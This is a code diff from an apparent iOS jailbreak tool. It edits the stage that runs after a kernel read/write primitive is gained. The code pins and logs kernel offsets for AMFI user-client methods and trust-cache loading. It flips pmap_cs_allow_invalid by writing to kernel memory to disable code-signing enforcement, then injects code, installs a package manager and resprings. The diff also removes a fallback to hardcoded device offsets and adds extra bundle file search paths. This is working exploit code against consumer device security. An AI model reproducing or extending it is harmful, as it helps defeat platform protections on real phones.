@@ -2,7 +2,6 @@
 #import "Lum1naBoard.h"
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
-#import "A14_23F77_LabOffsets.h"
 #import "Lum1naSocketKRW.h"
 #import "P06xLog.h"
 
@@ -103,6 +102,11 @@ static NSArray<NSString *> *ak_searchRoots(void) {
         [roots addObject:[bundle stringByAppendingPathComponent:@"basebin"]];
         [roots addObject:[bundle stringByAppendingPathComponent:@"pkgman"]];
     }
+    NSString *appRoot = [[NSBundle mainBundle] bundlePath];
+    if (appRoot && ![appRoot isEqualToString:bundle]) {
+        [roots addObject:appRoot];
+        [roots addObject:[appRoot stringByAppendingPathComponent:@"basebin"]];
+    }
     return roots;
 }
 
@@ -111,6 +115,11 @@ static NSString *ak_findFile(NSString *name) {
         NSString *path = [root stringByAppendingPathComponent:name];
         if ([[NSFileManager defaultManager] fileExistsAtPath:path]) return path;
     }
+    NSString *base = name.stringByDeletingPathExtension;
+    NSString *ext = name.pathExtension;
+    NSString *res = [[NSBundle mainBundle] pathForResource:base
+                                                    ofType:ext.length ? ext : nil];
+    if (res && [[NSFileManager defaultManager] fileExistsAtPath:res]) return res;
     return nil;
 }
 
@@ -524,29 +533,28 @@ static void ak_tryInstallPkgman(NSMutableString *s) {
      @"  5 package managers: Sileo first, then Zebra (Documents/pkgman/*.deb).\n"
      @"  6 respring: jbctl respring (sbreload / backboardd SIGTERM).\n"
      @"  7 persist/tempRoot/boot-rejailbreak stay HOLD — novel Lum1na, later.\n"];
-    if (off && off->tag && strcmp(off->tag, "A12X_23G71") == 0) {
+    if (!off) {
+        [s appendString:@"HOLD: LabOff() is NULL (unknown SKU). AMFI/pmap pins unfired.\n"];
+    } else if (off->tag && strcmp(off->tag, "A12X_23G71") == 0) {
         [s appendString:@"A12X 23G71 = no SPTM. momentarius is PPL-on-KRW, not a kernel slot.\n"];
         [s appendFormat:@"T8020 pins (unslid) tag %s:\n", tag];
         [s appendFormat:@"  AMFIUserClient_externalMethod  0x%llx\n", off->amfi_external];
         [s appendFormat:@"  loadTrustCache                 0x%llx  sel %u / %u\n",
          off->amfi_loadtc, off->amfi_sel_copy, off->amfi_sel_manifest];
-        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx\n", off->pmap_cs_allow];
+        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx  *(pmap+0x%x)=1\n",
+         off->pmap_cs_allow, off->pmap_cs_allow_off];
         [s appendString:@"  pmap_load_trust_cache          (cstring absent — not pinned)\n"];
         [s appendFormat:@"  aks_wvek                       0x%llx\n", off->aks_wvek_overflow];
         [s appendString:@"  owns_replaceable               present (twin 23G71)\n"];
     } else {
         [s appendString:@"A14 = PPL. pmap_cs_allow_invalid + AMFI UC sel 2/7 from the same process.\n"];
         [s appendFormat:@"23F77 pins (unslid) tag %s Ghidra 2026-09-29:\n", tag];
-        [s appendFormat:@"  AMFIUserClient_externalMethod  0x%llx\n",
-         off ? off->amfi_external : A14_23F77_AMFI_EXTERNALMETHOD];
+        [s appendFormat:@"  AMFIUserClient_externalMethod  0x%llx\n", off->amfi_external];
         [s appendFormat:@"  loadTrustCache                 0x%llx  sel %u / %u\n",
-         off ? off->amfi_loadtc : A14_23F77_AMFI_LOADTRUSTCACHE,
-         off ? off->amfi_sel_copy : A14_23F77_AMFI_LOADTC_SEL_COPY,
-         off ? off->amfi_sel_manifest : A14_23F77_AMFI_LOADTC_SEL_MANIFEST];
-        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx  *(pmap+0xca)=1\n",
-         off ? off->pmap_cs_allow : A14_23F77_PMAP_CS_ALLOW_INVALID];
-        [s appendFormat:@"  pmap_load_trust_cache          0x%llx\n",
-         off ? off->pmap_load_tc : A14_23F77_PMAP_LOAD_TRUST_CACHE];
+         off->amfi_loadtc, off->amfi_sel_copy, off->amfi_sel_manifest];
+        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx  *(pmap+0x%x)=1\n",
+         off->pmap_cs_allow, off->pmap_cs_allow_off];
+        [s appendFormat:@"  pmap_load_trust_cache          0x%llx\n", off->pmap_load_tc];
         [s appendString:@"  owns_replaceable               ABSENT (detach bit + size only)\n"];
         [s appendString:@"  EncType_Max                    PRESENT; session-mismatch ABSENT\n"];
     }
@@ -622,15 +630,25 @@ static void ak_tryInstallPkgman(NSMutableString *s) {
         return body.length ? body : s;
     }
 
+    if (!off) {
+        ak_log(s, @"HOLD: LabOff() NULL — refuse AMFI/pmap fire (no A14-macro fallback).");
+        [[Lum1naBoard shared] recordEvent:@"afterkread"
+                                     kind:@"hold"
+                                   detail:@"laboff-null"
+                                   source:@"afterkread"];
+        NSString *body = P06xLogDump(AK_TAG);
+        return body.length ? body : s;
+    }
+
     ak_log(s, @"FIRING: KRW test PASS — Dopamine-shaped AMFI/pmap_cs + inject + Sileo + respring");
     [[Lum1naBoard shared] recordEvent:@"afterkread"
                                  kind:@"fire"
                                detail:@"hasKread=YES"
                                source:@"afterkread"];
 
-    uint32_t selCopy = off ? off->amfi_sel_copy : A14_23F77_AMFI_LOADTC_SEL_COPY;
-    uint32_t selManifest = off ? off->amfi_sel_manifest : A14_23F77_AMFI_LOADTC_SEL_MANIFEST;
-    uint32_t pmapOff = A14_23F77_PMAP_CS_ALLOW_OFF;
+    uint32_t selCopy = off->amfi_sel_copy;
+    uint32_t selManifest = off->amfi_sel_manifest;
+    uint32_t pmapOff = off->pmap_cs_allow_off ? off->pmap_cs_allow_off : LabPmapCsAllowOff();
 
     uint64_t pmapVA = 0;
     for (NSDictionary *e in b.leaks) {
